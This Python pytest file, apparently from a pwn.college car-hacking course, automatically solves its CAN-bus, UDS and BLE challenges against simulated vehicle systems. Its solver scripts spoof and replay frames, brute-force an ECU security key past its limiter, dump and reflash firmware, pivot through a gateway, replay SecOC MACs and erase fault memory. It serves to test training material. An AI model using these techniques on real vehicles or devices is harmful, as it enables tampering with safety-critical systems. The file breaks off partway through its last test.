import base64
import subprocess
import textwrap
import time

import pytest

from utils import workspace_run, start_challenge, solve_challenge

SOLVE_TIMEOUT = 180

PRELUDE = """
import signal
import sys
import threading
import time

signal.alarm({timeout})
sys.path.insert(0, "/challenge")
import vcan


def flag_from_bus(bus, can_id=0x7C0):
    text = ""
    for frame_id, data in bus.frames():
        if frame_id != can_id:
            continue
        text += vcan.ascii_repr(data)
        if "pwn.college{{" in text and "}}" in text[text.index("pwn.college{{"):]:
            start = text.index("pwn.college{{")
            return text[start:text.index("}}", start) + 1]
"""


def workspace_python(script, *, user, timeout=SOLVE_TIMEOUT):
    source = PRELUDE.format(timeout=timeout) + textwrap.dedent(script)
    encoded = base64.b64encode(source.encode()).decode()
    result = workspace_run(
        f"echo {encoded} | base64 -d > /tmp/exploit.py && /run/dojo/bin/python3 -u /tmp/exploit.py",
        user=user,
    )
    return result.stdout.strip()


def workspace_poll(cmd, *, user, attempts=30, delay=1):
    for _ in range(attempts):
        try:
            return workspace_run(cmd, user=user)
        except subprocess.CalledProcessError:
            time.sleep(delay)
    raise AssertionError(f"workspace command never succeeded: {cmd}")


def assert_unreadable(path, *, user):
    with pytest.raises(subprocess.CalledProcessError):
        workspace_run(f"cat {path}", user=user)


def start(dojo, module, challenge, *, user, session):
    start_challenge(dojo, module, challenge, session=session)
    workspace_poll("test -S /run/vcan/vcan0", user=user)
BLE_PRELUDE = """
import signal
import sys
import time

signal.alarm({timeout})
sys.path.insert(0, "/challenge")
import ble


def cccd_of(client):
    return [handle for handle, uuid in client.attributes() if uuid == ble.UUID_CCCD][0]


def collect(text_pieces):
    joined = "".join(text_pieces)
    start = joined.index("pwn.college{{")
    return joined[start:joined.index("}}", start) + 1]
"""


def ble_python(script, *, user, timeout=SOLVE_TIMEOUT):
    source = BLE_PRELUDE.format(timeout=timeout) + textwrap.dedent(script)
    encoded = base64.b64encode(source.encode()).decode()
    result = workspace_run(
        f"echo {encoded} | base64 -d > /tmp/exploit.py && /run/dojo/bin/python3 -u /tmp/exploit.py",
        user=user,
    )
    return result.stdout.strip()


def start_ble(dojo, module, challenge, *, user, session):
    start_challenge(dojo, module, challenge, session=session)
    workspace_poll("ls /run/bluetooth/*.adv", user=user)


def solved(output):
    return output.splitlines()[-1] if output else ""


def test_bus_infrastructure(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "sniffing", user=user, session=session)

    # .init backgrounds the hub and the ECU and then exits; both have to outlive it
    processes = workspace_run("ps -eo args", user=user).stdout
    assert "/challenge/vcan.py vcan0" in processes, processes
    assert "/challenge/ecu" in processes, processes

    # every challenge script is a `#!/run/dojo/bin/python3 -u` shebang
    workspace_run("test -x /run/dojo/bin/python3", user=user)

    # the challenge tools have to win the PATH against the nix profile
    for tool in ["candump", "cansend"]:
        resolved = workspace_run(f"command -v {tool}", user=user).stdout.strip()
        assert resolved in (f"/run/challenge/bin/{tool}", f"/challenge/bin/{tool}"), resolved

    dump = workspace_run("candump -a -n 5 vcan0", user=user).stdout
    assert dump.count(" vcan0 ") == 5, dump


def test_firmware_is_hidden(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "injection", user=user, session=session)

    assert_unreadable("/challenge/ecu", user=user)
    workspace_run("cat /challenge/vcan.py", user=user)


def test_sniffing(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "sniffing", user=user, session=session)

    flag = workspace_python("""
        print(flag_from_bus(vcan.Bus("vcan0")))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "sniffing", session=session, flag=flag)


def test_filtering(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "filtering", user=user, session=session)

    flag = workspace_python("""
        bus = vcan.Bus("vcan0")
        chunks = {}
        for can_id, data in bus.frames():
            if can_id != 0x2A1:
                continue
            chunks[data[0]] = data[1:].decode()
            if sorted(chunks) != list(range(max(chunks) + 1)):
                continue
            candidate = "".join(chunks[index] for index in sorted(chunks))
            if candidate.startswith("pwn.college{") and candidate.endswith("}"):
                print(candidate)
                break
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "filtering", session=session, flag=flag)


def test_fob_capture(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "fob-capture", user=user, session=session)

    # pressing the fob without a capture running must lose the transmission,
    # which is the entire point of the challenge
    workspace_run("/challenge/press-fob", user=user)
    with pytest.raises(subprocess.CalledProcessError):
        workspace_run("timeout 3 candump -n 1 vcan0,2C5:7FF", user=user)

    flag = workspace_python("""
        listener = vcan.Bus("vcan0")
        presser = vcan.Bus("vcan0")
        presser.send(0x0FF, bytes([0x01]))
        print(flag_from_bus(listener, can_id=0x2C5))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "fob-capture", session=session, flag=flag)


def test_rolling_code(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "rolling-code", user=user, session=session)

    output = workspace_python("""
        listener = vcan.Bus("vcan0")
        sender = vcan.Bus("vcan0")
        frames = listener.frames()

        sender.send(0x0FF, bytes([0x01]))
        burst = []
        last_seen = time.time()
        for can_id, data in frames:
            if can_id == 0x2C5:
                burst.append(bytes(data))
                last_seen = time.time()
            elif burst and time.time() - last_seen > 0.5:
                break
        assert len(burst) > 1, "a press must transmit more than one code"

        # the code the receiver already consumed must not unlock anything
        deadline = time.time() + 3
        for can_id, _ in frames:
            if time.time() > deadline:
                break
        sender.send(0x2C5, burst[0])
        deadline = time.time() + 4
        for can_id, data in frames:
            if time.time() > deadline:
                break
            assert can_id != 0x7C0, "a consumed rolling code was accepted"

        deadline = time.time() + 6
        for can_id, _ in frames:
            if time.time() > deadline:
                break
        sender.send(0x2C5, burst[1])
        print(flag_from_bus(listener, can_id=0x7C0))
    """, user=user)
    flag = output.splitlines()[-1]
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "rolling-code", session=session, flag=flag)


def test_injection(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "injection", user=user, session=session)

    flag = workspace_python("""
        bus = vcan.Bus("vcan0")
        for can_id, data in bus.frames():
            if can_id == 0x19A:
                bus.send(0x19B, bytes([0x02, 0xFF, data[2], data[3]]))
                break
        print(flag_from_bus(bus))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "injection", session=session, flag=flag)


def test_spoofing(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "spoofing", user=user, session=session)

    flag = workspace_python("""
        flooder = vcan.Bus("vcan0")
        listener = vcan.Bus("vcan0")

        def flood():
            payload = bytes([0x00, 0x00, 0x33, 0xF4, 0x00, 0x00, 0x00, 0x00])
            while True:
                flooder.send(0x1C4, payload)
                time.sleep(0.005)

        threading.Thread(target=flood, daemon=True).start()
        print(flag_from_bus(listener))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "spoofing", session=session, flag=flag)


def test_integrity(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "integrity", user=user, session=session)

    output = workspace_python("""
        listener = vcan.Bus("vcan0")
        sender = vcan.Bus("vcan0")
        sender.send(0x0FE, bytes([0x01]))

        specimen = []
        last_seen = time.time()
        for can_id, data in listener.frames():
            if can_id == 0x1F5:
                specimen.append(bytes(data))
                last_seen = time.time()
            elif specimen and time.time() - last_seen > 0.5:
                break

        offsets = {(frame[7] - sum(frame[:7])) & 0xFF for frame in specimen}
        assert len(offsets) == 1, f"checksum is not a constant-offset sum: {offsets}"
        offset = offsets.pop()
        counter = (specimen[-1][6] + 1) % 16

        for _ in range(12):
            payload = bytes([0x0B, 0xB8, 0x00, 0x00, 0x00, 0x00, counter])
            sender.send(0x1F5, payload + bytes([(sum(payload) + offset) & 0xFF]))
            counter = (counter + 1) % 16
            time.sleep(0.02)

        print(flag_from_bus(listener))
    """, user=user)
    flag = output.splitlines()[-1]
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "integrity", session=session, flag=flag)


def test_iso_tp(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "uds", "iso-tp", user=user, session=session)

    # the objective is to implement ISO-TP, so the reference implementation is hidden
    assert_unreadable("/challenge/isotp.py", user=user)

    flag = workspace_python("""
        bus = vcan.Bus("vcan0")
        frames = bus.frames()
        bus.send(0x7E0, bytes([0x03, 0x22, 0xF1, 0xAB, 0, 0, 0, 0]))

        payload = bytearray()
        total = None
        for can_id, data in frames:
            if can_id != 0x7E8:
                continue
            kind = data[0] >> 4
            if kind == 0x1 and total is None:
                total = ((data[0] & 0x0F) << 8) | data[1]
                payload += data[2:8]
                bus.send(0x7E0, bytes([0x30, 0x00, 0x00, 0, 0, 0, 0, 0]))
            elif kind == 0x2 and total is not None:
                payload += data[1:]
            if total is not None and len(payload) >= total:
                break

        response = bytes(payload[:total])
        assert response[:3] == bytes([0x62, 0xF1, 0xAB]), response.hex()
        print(response[3:].decode())
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "uds", "iso-tp", session=session, flag=flag)


def test_ecu_discovery(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "uds", "ecu-discovery", user=user, session=session)

    output = workspace_python("""
        import isotp

        bus = vcan.Bus("vcan0")
        for address in range(0x700, 0x800):
            bus.send(address, bytes([0x02, 0x3E, 0x00, 0, 0, 0, 0, 0]))
            time.sleep(0.002)

        responders = set()
        deadline = time.time() + 2
        for can_id, data in bus.frames():
            if time.time() > deadline:
                break
            if 0x700 <= can_id < 0x800 and len(data) >= 2 and data[1] == 0x7E:
                responders.add(can_id - 8)
        print("responders", " ".join(hex(address) for address in sorted(responders)))

        response = isotp.request(bus, 0x745, 0x74D, bytes([0x22, 0xF1, 0xFF]), timeout=2)
        assert response[0] == 0x62, response.hex()
        print(response[3:].decode())
    """, user=user)

    responders, flag = output.splitlines()[0], output.splitlines()[-1]
    assert "0x745" in responders, responders
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "uds", "ecu-discovery", session=session, flag=flag)


def test_security_access(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "uds", "security-access", user=user, session=session)

    output = workspace_python("""
        bus = vcan.Bus("vcan0")
        frames = bus.frames()

        def request(payload, timeout=5.0):
            bus.send(0x7E0, bytes([len(payload)]) + payload + b"\\x00" * (7 - len(payload)))
            deadline = time.time() + timeout
            for can_id, data in frames:
                if time.time() > deadline:
                    raise TimeoutError(payload.hex())
                if can_id != 0x7E8:
                    continue
                if data[0] >> 4 == 0x0:
                    return data[1:1 + (data[0] & 0x0F)]
                if data[0] >> 4 == 0x1:
                    return data[2:8]

        assert request(bytes([0x27, 0x01]))[0] == 0x7F, "seed served outside the extended session"
        request(bytes([0x10, 0x03]))
        seed = request(bytes([0x27, 0x01]))
        assert seed[0] == 0x67, seed.hex()

        assert request(bytes([0x31, 0x01, 0xF0, 0x0D]))[2] == 0x33, "routine ran while locked"

        for _ in range(3):
            request(bytes([0x27, 0x02, 0xFF, 0xFF]))
        assert request(bytes([0x27, 0x02, 0xFF, 0xFE]))[2] == 0x37, "attempt limiter did not engage"
        request(bytes([0x10, 0x03]))
        assert request(bytes([0x27, 0x02, 0xFF, 0xFE]))[2] == 0x35, "session reset did not clear the limiter"

        key = 0
        attempts = 0
        while True:
            request(bytes([0x10, 0x03]))
            for _ in range(2):
                response = request(bytes([0x27, 0x02, key >> 8, key & 0xFF]))
                attempts += 1
                key = (key + 1) & 0xFFFF
                if response[0] == 0x67:
                    break
                assert response[2] == 0x35, response.hex()
            else:
                continue
            break
        print("attempts", attempts)

        payload = bytearray()
        bus.send(0x7E0, bytes([0x04, 0x31, 0x01, 0xF0, 0x0D, 0, 0, 0]))
        total = None
        for can_id, data in frames:
            if can_id != 0x7E8:
                continue
            if data[0] >> 4 == 0x1 and total is None:
                total = ((data[0] & 0x0F) << 8) | data[1]
                payload += data[2:8]
                bus.send(0x7E0, bytes([0x30, 0x00, 0x00, 0, 0, 0, 0, 0]))
            elif data[0] >> 4 == 0x2 and total is not None:
                payload += data[1:]
            if total is not None and len(payload) >= total:
                break
        print(bytes(payload[4:total]).decode())
    """, user=user)

    flag = output.splitlines()[-1]
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "uds", "security-access", session=session, flag=flag)


def test_firmware_dump(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "uds", "firmware-dump", user=user, session=session)

    output = workspace_python("""
        import isotp
        import re

        bus = vcan.Bus("vcan0")

        def uds(payload):
            return isotp.request(bus, 0x7E0, 0x7E8, bytes(payload))

        assert uds([0x23, 0x14, 0x08, 0, 0, 0, 0x40])[0] == 0x7F, "memory readable outside a session"

        part = uds([0x22, 0xF1, 0x8C])
        assert b"STM32" in part[3:], part.hex()
        assert uds([0x10, 0x03])[0] == 0x50

        image = bytearray()
        address = 0x08000000
        while True:
            response = uds([0x23, 0x14, *address.to_bytes(4, "big"), 0x40])
            if response[0] != 0x63:
                break
            image += response[1:]
            address += 0x40
        assert len(image) == 0x2000, hex(len(image))

        token = bytes(image)[bytes(image).index(b"ENGTOKEN") + 8:][:8]
        assert uds([0xBF, 0x01, *b"AAAAAAAA"])[2] == 0x35, "wrong token accepted"

        response = uds([0xBF, 0x01, *token])
        assert response[0] == 0xFF, response.hex()
        print(response[2:].decode())
    """, user=user)

    flag = output.splitlines()[-1]
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "uds", "firmware-dump", session=session, flag=flag)

def test_reflash(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "uds", "reflash", user=user, session=session)

    output = workspace_python("""
        import isotp

        bus = vcan.Bus("vcan0")

        def uds(payload):
            return isotp.request(bus, 0x7E0, 0x7E8, bytes(payload))

        base, size = 0x08010000, 0x40
        assert uds([0x34, 0x00, 0x44, *base.to_bytes(4, "big"), 0, 0, 0, size])[2] == 0x22, \
            "download allowed outside the programming session"
        assert uds([0x10, 0x02])[0] == 0x50

        block = bytearray()
        while len(block) < size:
            response = uds([0x23, 0x14, *(base + len(block)).to_bytes(4, "big"), 0x20])
            assert response[0] == 0x63, response.hex()
            block += response[1:]

        offset = int(bytes(block[0x20:0x30]).split(b"@")[1].split(bytes([0]))[0], 16)
        block[offset:offset + 4] = bytes([0xDE, 0xAD, 0xBE, 0xEF])

        response = uds([0x34, 0x00, 0x44, *base.to_bytes(4, "big"), *size.to_bytes(4, "big")])
        assert response[0] == 0x74, response.hex()
        max_block = response[2]

        assert uds([0x36, 0x02, *block[:max_block]])[2] == 0x24, "block ordering not enforced"
        response = uds([0x34, 0x00, 0x44, *base.to_bytes(4, "big"), *size.to_bytes(4, "big")])
        assert response[0] == 0x74, response.hex()

        for index, start_offset in enumerate(range(0, len(block), max_block), start=1):
            assert uds([0x36, index, *block[start_offset:start_offset + max_block]])[0] == 0x76

        response = uds([0x37, (~sum(block) + 1) & 0xFF])
        assert response[0] == 0x77, response.hex()
        print(response[2:].decode())
    """, user=user)
    flag = output.splitlines()[-1]
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "uds", "reflash", session=session, flag=flag)


def test_gateway(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "uds", "gateway", user=user, session=session)

    # the powertrain bus stands in for wiring the OBD connector cannot reach
    with pytest.raises(subprocess.CalledProcessError):
        workspace_run("timeout 3 candump -n 1 vcan1", user=user)

    output = workspace_python("""
        import isotp

        bus = vcan.Bus("vcan0")
        standard = range(0x700, 0x800)

        for address in standard:
            bus.send(address, bytes([0x02, 0x3E, 0x00, 0, 0, 0, 0, 0]))
            time.sleep(0.002)
        responders = set()
        deadline = time.time() + 2
        for can_id, data in bus.frames():
            if time.time() > deadline:
                break
            if can_id in standard and len(data) >= 2 and data[1] == 0x7E:
                responders.add(can_id - 8)
        gateway = sorted(responders)[0]

        routing = isotp.request(bus, gateway, gateway + 8, bytes([0x22, 0xF1, 0xB0]), timeout=3)
        assert routing[0] == 0x62, routing.hex()
        entries = routing[3:].partition(b" ")[2]
        routes = [int.from_bytes(entries[i:i + 2], "big") for i in range(0, len(entries), 2)]
        pivot = next(route for route in routes if route not in standard)

        response = isotp.request(bus, pivot, pivot + 8, bytes([0x31, 0x01, 0xC0, 0x01]), timeout=5)
        assert response[0] == 0x71, response.hex()
        print(response[4:].decode())
    """, user=user)
    flag = output.splitlines()[-1]
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "uds", "gateway", session=session, flag=flag)

def test_secoc(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "can-bus", "secoc", user=user, session=session)

    output = workspace_python("""
        listener = vcan.Bus("vcan0")
        sender = vcan.Bus("vcan0")
        frames = listener.frames()
        UNLOCK = bytes([0x02, 0xFF])

        sender.send(0x0FF, bytes([0x01]))
        unlock_mac = None
        locks = []
        deadline = time.time() + 15
        for can_id, data in frames:
            if time.time() > deadline:
                break
            if can_id != 0x1B0:
                continue
            if bytes(data[0:2]) == UNLOCK:
                unlock_mac = bytes(data[3:6])
            else:
                locks.append((data[2], bytes(data[3:6])))
            if unlock_mac and len(locks) >= 2:
                break
        assert unlock_mac, "never saw an authenticated unlock"
        assert len({mac for _, mac in locks}) == 1, "the MAC changed with freshness"
        assert len({value for value, _ in locks}) > 1, "freshness never advanced"

        current = None
        deadline = time.time() + 6
        for can_id, data in frames:
            if time.time() > deadline:
                break
            if can_id == 0x1B1:
                current = data[1]
                break
        assert current is not None

        sender.send(0x1B0, UNLOCK + bytes([(current + 1) & 0xFF]) + unlock_mac)
        print(flag_from_bus(listener))
    """, user=user)
    flag = output.splitlines()[-1]
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "can-bus", "secoc", session=session, flag=flag)


def test_fault_memory(random_user, car_hacking_dojo):
    user, session = random_user
    start(car_hacking_dojo, "uds", "fault-memory", user=user, session=session)

    output = workspace_python("""
        import isotp

        bus = vcan.Bus("vcan0")

        def uds(payload):
            return isotp.request(bus, 0x7E0, 0x7E8, bytes(payload))

        def faults():
            body = uds([0x19, 0x02, 0xFF])[3:]
            return [int.from_bytes(body[i:i + 3], "big") for i in range(0, len(body), 4)]

        assert faults() == [], "fault memory was not empty to begin with"

        routine = None
        for candidate in range(0x0200, 0x0210):
            response = uds([0x31, 0x01, candidate >> 8, candidate & 0xFF])
            if response[0] == 0x7F and response[2] == 0x22:
                routine = candidate
        assert routine is not None, "no routine reported conditionsNotCorrect"
        assert faults(), "scanning left no trace, so the challenge has no teeth"

        assert uds([0x14, 0xFF, 0xFF, 0xFF])[0] == 0x54
        assert faults() == [], "clearing did not empty the fault memory"

        response = uds([0x31, 0x01, routine >> 8, routine & 0xFF])
        assert response[0] == 0x71, response.hex()
        print(response[4:].decode())
    """, user=user)
    flag = output.splitlines()[-1]
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "uds", "fault-memory", session=session, flag=flag)


def test_ble_infrastructure(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "discovery", user=user, session=session)

    # .init backgrounds the peripheral and exits; it has to outlive that
    assert "/challenge/peripheral" in workspace_run("ps -eo args", user=user).stdout

    for tool in ["gatttool", "hcitool", "hcidump"]:
        resolved = workspace_run(f"command -v {tool}", user=user).stdout.strip()
        assert resolved in (f"/run/challenge/bin/{tool}", f"/challenge/bin/{tool}"), resolved

    # the peripheral's firmware is not the student's to read
    assert_unreadable("/challenge/peripheral", user=user)

    listing = workspace_run("hcitool lescan", user=user).stdout
    assert "OBDLink" in listing, listing


def test_ble_discovery(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "discovery", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("c4:be:84:20:11:07")
        for _, _, value_handle, uuid in client.characteristics():
            value = client.read(value_handle)
            if value.startswith(b"pwn.college{"):
                print(value.decode())
                break
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "discovery", session=session, flag=flag)


def test_ble_descriptors(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "descriptors", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("d9:1c:03:77:4e:22")
        # the characteristic listing does not mention descriptors at all
        listed = {handle for _, _, handle, _ in client.characteristics()}
        for handle, uuid in client.attributes():
            if uuid != ble.UUID_USER_DESCRIPTION:
                continue
            assert handle not in listed
            value = client.read(handle)
            if value.startswith(b"pwn.college{"):
                print(value.decode())
                break
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "descriptors", session=session, flag=flag)


def test_ble_encoding(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "encoding", user=user, session=session)
    flag = ble_python("""
        import base64

        client = ble.Client("e2:55:9a:04:c1:38")
        parts = {}
        for _, _, value_handle, uuid in client.characteristics():
            value = client.read(value_handle)
            if uuid == 0xFF01:
                parts[0] = bytes.fromhex(value.decode()).decode()
            elif uuid == 0xFF02:
                parts[1] = base64.b64decode(value).decode()
        print(parts[0] + parts[1])
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "encoding", session=session, flag=flag)


def test_ble_fragments(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "fragments", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("f7:31:ad:59:80:b4")
        index_of, payload_of = {}, {}
        for _, _, value_handle, uuid in client.characteristics():
            if 0xFD00 <= uuid <= 0xFD04:
                index_of[uuid - 0xFD00] = client.read(value_handle)[0]
            elif 0xFC00 <= uuid <= 0xFC04:
                payload_of[uuid - 0xFC00] = client.read(value_handle)
        by_handle = b"".join(payload_of[slot] for slot in sorted(payload_of))
        by_index = b"".join(payload_of[slot] for slot in sorted(payload_of, key=lambda s: index_of[s]))
        assert by_handle != by_index, "handle order already matched record order"
        print(by_index.decode())
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "fragments", session=session, flag=flag)


def test_ble_unlock(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "unlock", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("a1:6f:22:d8:03:9c")
        characteristics = {uuid: handle for _, _, handle, uuid in client.characteristics()}

        # the vault itself refuses a write, and says which permission you broke
        try:
            client.write(characteristics[0xFF02], b"open")
            raise AssertionError("the vault accepted a write")
        except ble.ATTError as error:
            assert error.code == ble.ERR_WRITE_NOT_PERMITTED, error

        key = None
        for handle, uuid in client.attributes():
            if uuid == ble.UUID_USER_DESCRIPTION:
                note = client.read(handle)
                if b"default" in note:
                    key = note.split()[-1]
        client.write(characteristics[0xFF01], bytes.fromhex(key.decode()))
        print(client.read(characteristics[0xFF02]).decode())
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "unlock", session=session, flag=flag)


def test_ble_sequence(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "sequence", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("b8:44:e1:07:2f:65")
        characteristics = {uuid: handle for _, _, handle, uuid in client.characteristics()}
        step, status = characteristics[0xFF01], characteristics[0xFF02]

        # a wrong step sends it back to the beginning rather than being ignored
        client.write(step, bytes([1]))
        client.write(step, bytes([3]))
        assert b"0/3" in client.read(status), client.read(status)

        for value in (1, 2, 3):
            client.write(step, bytes([value]))
        print(client.read(status).decode())
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "sequence", session=session, flag=flag)


def test_ble_notify(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "notify", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("e6:0b:44:91:2c:7d")
        client.subscribe(cccd_of(client))
        print(collect(value.decode() for _, value in client.events_stream(timeout=3)))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "notify", session=session, flag=flag)


def test_ble_indicate(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "indicate", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("aa:7c:19:d0:63:41")
        cccd = cccd_of(client)

        # a notify subscription on an indicate-only characteristic gets nothing
        client.subscribe(cccd, indicate=False)
        assert not list(client.events_stream(timeout=1)), "notify subscription produced events"

        # and without confirmations the peripheral stops after the first record
        client.subscribe(cccd, indicate=True)
        unconfirmed = list(client.events_stream(timeout=1, confirm=False))
        assert len(unconfirmed) == 1, f"{len(unconfirmed)} records arrived unconfirmed"

        client.confirm()
        pieces = [unconfirmed[0][1].decode()]
        pieces += [value.decode() for _, value in client.events_stream(timeout=3)]
        print(collect(pieces))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "indicate", session=session, flag=flag)


def test_ble_stream(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "stream", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("3f:82:5e:11:a0:96")
        client.subscribe(cccd_of(client))
        pieces = {}
        arrival = []
        for _, value in client.events_stream(timeout=3):
            pieces[value[0]] = value[1:].decode()
            arrival.append(value[0])
        assert arrival != sorted(arrival), "fragments arrived already in order"
        print("".join(pieces[index] for index in sorted(pieces)))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "stream", session=session, flag=flag)


def test_ble_trigger(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "trigger", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("9d:35:c8:02:77:1e")
        characteristics = {uuid: handle for _, _, handle, uuid in client.characteristics()}

        # a push has no queue: asking before subscribing loses the answer
        client.write(characteristics[0xFF01], b"go")
        assert not list(client.events_stream(timeout=1)), "unsubscribed client was notified"

        client.subscribe(cccd_of(client))
        client.write(characteristics[0xFF01], b"go")
        print(collect(value.decode() for _, value in client.events_stream(timeout=3)))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "trigger", session=session, flag=flag)


def test_ble_hidden_notify(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "hidden-notify", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("72:e4:1b:8a:55:c0")
        declared = {uuid: properties for _, properties, _, uuid in client.characteristics()}
        assert not declared.get(0xFFF2, 0) & ble.PROP_NOTIFY, "the characteristic advertises NOTIFY"
        client.subscribe(cccd_of(client))
        print(collect(value.decode() for _, value in client.events_stream(timeout=3)))
    """, user=user)
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "hidden-notify", session=session, flag=flag)


def _advertising_collector(address, ad_type, active):
    return f"""
        pieces = {{}}
        for _ in range(60):
            for reported, advertisement, response in ble.scan(active={active}):
                if reported != "{address}":
                    continue
                for payload in [advertisement] + ([response] if response else []):
                    for kind, data in ble.Advertisement.parse(payload):
                        if kind != {ad_type}:
                            continue
                        body = data[2:]
                        pieces[body[0]] = body[1:]
            if pieces and sorted(pieces) == list(range(max(pieces) + 1)):
                joined = b"".join(pieces[index] for index in sorted(pieces))
                if joined.endswith(b"}}"):
                    print(joined.decode())
                    break
            time.sleep(0.15)
    """


def test_ble_beacon(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "beacon", user=user, session=session)
    # a passive scan is enough here: this peripheral has no scan response
    flag = solved(ble_python(
        _advertising_collector("5c:31:0e:b7:44:29", "ble.AD_MANUFACTURER", "False"), user=user))
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "beacon", session=session, flag=flag)


def test_ble_scan_response(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "scan-response", user=user, session=session)

    # the scan response is not written down anywhere; only asking produces it
    broadcast = workspace_run("cat /run/bluetooth/*.adv", user=user).stdout
    assert "rsp=" not in broadcast, broadcast

    passive = solved(ble_python(
        _advertising_collector("b3:6a:27:cd:15:82", "ble.AD_MANUFACTURER", "False"),
        user=user, timeout=60))
    assert not passive.startswith("pwn.college{"), "a passive scan saw the whole thing"

    flag = solved(ble_python(
        _advertising_collector("b3:6a:27:cd:15:82", "ble.AD_MANUFACTURER", "True"), user=user))
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "scan-response", session=session, flag=flag)


def test_ble_service_data(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "service-data", user=user, session=session)
    flag = solved(ble_python(
        _advertising_collector("7e:12:9f:40:aa:31", "ble.AD_SERVICE_DATA_UUID16", "False"),
        user=user))
    assert flag.startswith("pwn.college{")
    solve_challenge(car_hacking_dojo, "ble", "service-data", session=session, flag=flag)


def test_ble_hidden_handles(random_user, car_hacking_dojo):
    user, session = random_user
    start_ble(car_hacking_dojo, "ble", "hidden-handles", user=user, session=session)
    flag = ble_python("""
        client = ble.Client("68:9e:19:33:c7:04")
        discovered = {handle for handle, _ in client.attributes()}

        found = None
        for handle in range(1, 0x40):
            try:
                value = client.read(handle)
